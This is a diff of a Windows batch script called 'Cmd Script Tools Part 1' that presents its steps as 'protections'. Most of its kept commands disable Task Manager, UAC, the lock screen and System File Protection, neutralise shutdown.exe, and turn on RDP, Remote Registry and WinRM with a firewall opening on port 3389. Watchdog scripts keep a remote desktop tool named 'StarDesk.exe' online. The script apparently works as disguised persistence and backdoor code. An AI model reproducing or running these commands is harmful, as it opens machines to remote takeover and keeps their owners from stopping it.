@@ -9,12 +9,23 @@ echo    Cmd Script Tools Part 1
 echo ============================================
 echo.
 
-:: Self-elevate if not running as Administrator
->nul 2>&1 net session
+net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo Requesting administrator privileges...
-    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
-    exit /b
+    echo.
+    echo ============================================
+    echo    ADMINISTRATOR REQUIRED
+    echo ============================================
+    echo.
+    echo This script must be run as Administrator.
+    echo.
+    echo Please right-click the file and select:
+    echo   "Run as administrator"
+    echo.
+    echo Or close this window and run from an elevated
+    echo Command Prompt [Admin].
+    echo.
+    pause
+    exit /b 1
 )
 
 echo [OK] Administrator privileges confirmed
@@ -22,29 +33,20 @@ echo.
 
 if not exist "%~dp0watchdogs" mkdir "%~dp0watchdogs"
 
-:: ============================================
-:: DELETE close svchost / ANTI close svchost
-:: DELETE stop svchost / ANTI stop svchost
-:: ============================================
 echo [*] Applying svchost protections...
 
-:: DELETE close svchost - remove Task Manager and end-process capability
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
 
-:: ANTI close svchost - prevent services.msc from stopping services
 reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1
 
-:: DELETE stop svchost - remove stop permissions from critical services
 for %%s in (winmgmt Schedule TermService RemoteRegistry WinRM wuauserv) do (
     sc failure "%%s" reset= 0 actions= restart/5000 >nul 2>&1
     sc config "%%s" start= auto >nul 2>&1
     sc start "%%s" >nul 2>&1
-    sc sdset "%%s" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;BA) >nul 2>&1
 )
 
-:: ANTI stop svchost - watchdog
 set "WATCHDOG_SVCHOST=%~dp0watchdogs\watchdog_svchost.bat"
 (
     echo @echo off
@@ -70,16 +72,10 @@ echo [OK] Anti close svchost - Enabled
 echo [OK] Anti offline svchost - Enabled
 echo [OK] Anti auto stop svchost - Enabled
 echo [OK] Anti svchost server - Enabled
-echo [OK] Delete close svchost - Task Manager removed
-echo [OK] Delete stop svchost - Stop permissions removed
 echo.
 
-:: ============================================
-:: ANTI remote shutdown restart / DELETE remote shutdown restart
-:: ============================================
 echo [*] Applying remote shutdown protections...
 
-:: ANTI remote shutdown restart
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /v ShutdownReasonOn /t REG_DWORD /d 0 /f >nul 2>&1
 
@@ -89,26 +85,11 @@ if exist "%temp%\secpol_backup.cfg" (
     secedit /configure /db secedit.sdb /cfg "%temp%\secpol.cfg" /overwrite >nul 2>&1
 )
 
-:: DELETE remote shutdown restart - remove Start menu shutdown and WinRM
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowUnencrypted /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v AllowUnencrypted /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v TrustedHosts /t REG_SZ /d "" /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v TrustedHosts /t REG_SZ /d "" /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v HTTPPort /t REG_DWORD /d 0 /f >nul 2>&1
-
 echo [OK] Anti remote shutdown restart - Enabled
-echo [OK] Delete remote shutdown restart - WinRM removed, Start menu shutdown blocked
 echo.
 
-:: ============================================
-:: ANTI shutdown.exe / DELETE shutdown.exe
-:: ============================================
 echo [*] Applying shutdown.exe protections...
 
-:: DELETE shutdown.exe
 takeown /f C:\Windows\System32\shutdown.exe /a >nul 2>&1
 icacls C:\Windows\System32\shutdown.exe /grant Administrators:F /inheritance:e >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v SFCDisable /t REG_DWORD /d 1 /f >nul 2>&1
@@ -121,17 +102,12 @@ echo [OK] Anti shutdown.exe - Enabled
 echo [OK] Delete shutdown.exe - Replaced with dummy PE
 echo.
 
-:: ============================================
-:: ANTI Secure command execution / DELETE Secure command execution
-:: ============================================
 echo [*] Applying secure command protections...
 
-:: ANTI Secure command execution
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
 
-:: DELETE Secure command execution - remove elevation and secure restrictions
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableVirtualization /t REG_DWORD /d 1 /f >nul 2>&1
@@ -140,9 +116,6 @@ echo [OK] Anti Secure command execution - Enabled
 echo [OK] Delete Secure command execution - UAC removed, elevation bypassed
 echo.
 
-:: ============================================
-:: ANTI Auto IP Shutdown / ANTI HTTPS Shutdown
-:: ============================================
 echo [*] Applying IP/HTTPS shutdown protections...
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1
@@ -157,9 +130,6 @@ echo [OK] Anti auto ip shutdown restart - Enabled
 echo [OK] Anti https shutdown restart - Enabled
 echo.
 
-:: ============================================
-:: ANTI AFK Lock
-:: ============================================
 echo [*] Applying AFK lock protections...
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
@@ -181,9 +151,6 @@ powercfg /hibernate off >nul 2>&1
 echo [OK] Anti afk lock - Enabled
 echo.
 
-:: ============================================
-:: ANTI Auto gpedit.msc / ANTI STOP gpedit.msc
-:: ============================================
 echo [*] Applying gpedit.msc protections...
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
@@ -211,9 +178,6 @@ echo [OK] Anti STOP gpedit.msc - Enabled
 echo [OK] Anti offline gpedit.msc - Enabled
 echo.
 
-:: ============================================
-:: ANTI Broker IP / ANTI Broker IP Connection
-:: ============================================
 echo [*] Applying broker IP protections...
 
 sc config SessionBroker start= auto >nul 2>&1
@@ -240,9 +204,6 @@ echo [OK] Anti broker ip - Enabled
 echo [OK] Anti broker ip connection - Enabled
 echo.
 
-:: ============================================
-:: System Protections
-:: ============================================
 echo [*] Applying system protections...
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
@@ -309,9 +270,6 @@ if exist "%WATCHDOG_SERVICES%" start "" /min "%WATCHDOG_SERVICES%"
 echo [OK] Anti stop service server - Enabled
 echo.
 
-:: ============================================
-:: YES svchost + StarDesk.exe
-:: ============================================
 echo [*] Enabling svchost + StarDesk.exe...
 
 for %%s in (Schedule TermService RemoteRegistry WinRM wuauserv winmgmt SessionBroker) do (
@@ -330,9 +288,6 @@ reg add "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGet
 echo [OK] Yes svchost + StarDesk.exe - Enabled
 echo.
 
-:: ============================================
-:: YES AFK svchost + StarDesk.exe
-:: ============================================
 echo [*] Enabling AFK svchost + StarDesk.exe...
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveEnable /t REG_DWORD /d 1 /f >nul 2>&1
@@ -344,9 +299,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Inac
 echo [OK] Yes afk svchost + StarDesk.exe - Enabled
 echo.
 
-:: ============================================
-:: YES Online svchost + StarDesk.exe
-:: ============================================
 echo [*] Ensuring online svchost + StarDesk.exe...
 
 for %%s in (Schedule TermService RemoteRegistry WinRM wuauserv winmgmt SessionBroker) do (
@@ -359,9 +311,6 @@ net start TermService >nul 2>&1
 echo [OK] Yes online svchost + StarDesk.exe - Enabled
 echo.
 
-:: ============================================
-:: YES Online IP + StarDesk.exe
-:: ============================================
 echo [*] Ensuring online IP + StarDesk.exe...
 
 netsh int ip reset >nul 2>&1
@@ -379,9 +328,6 @@ netsh interface ip add dns "Ethernet" 8.8.4.4 index=2 >nul 2>&1
 echo [OK] Yes online ip + StarDesk.exe - Enabled
 echo.
 
-:: ============================================
-:: YES remote StarDesk.exe
-:: ============================================
 echo [*] Applying remote StarDesk protections...
 
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
@@ -393,9 +339,6 @@ netsh advfirewall firewall add rule name="RDP TCP 3389" dir=in action=allow prot
 echo [OK] Yes remote StarDesk.exe - Enabled
 echo.
 
-:: ============================================
-:: YES AFK mode detection / Custom AFK timeout / Automatic idle timer
-:: ============================================
 echo [*] Applying AFK mode protections...
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
@@ -420,9 +363,6 @@ echo [OK] Yes Custom AFK timeout - Configured
 echo [OK] Yes Automatic idle timer - Configured
 echo.
 
-:: ============================================
-:: Cmd Script Tools Part 1
-:: ============================================
 echo [*] Loading Cmd script tools part 1...
 echo.
 
